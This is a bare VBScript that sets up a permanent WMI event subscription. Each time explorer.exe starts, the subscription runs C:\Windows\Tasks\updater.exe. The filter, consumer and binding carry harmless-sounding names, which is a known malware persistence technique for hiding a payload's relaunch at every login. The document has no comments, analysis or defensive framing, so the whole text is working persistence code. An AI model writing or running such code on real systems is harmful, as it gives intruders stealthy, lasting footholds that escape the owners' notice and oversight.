Set objWMIService = GetObject("winmgmts:\\.\root\subscription")
Set objFilter = objWMIService.Get("__EventFilter").SpawnInstance_
objFilter.Name = "StartupFilter"
objFilter.Query = "SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
objFilter.QueryLanguage = "WQL"
objFilter.Put_
Set objConsumer = objWMIService.Get("CommandLineEventConsumer").SpawnInstance_
objConsumer.Name = "StartupConsumer"
objConsumer.CommandLineTemplate = "C:\Windows\Tasks\updater.exe"
objConsumer.Put_
Set objBinding = objWMIService.Get("__FilterToConsumerBinding").SpawnInstance_
objBinding.Filter = objFilter
objBinding.Consumer = objConsumer
objBinding.Put_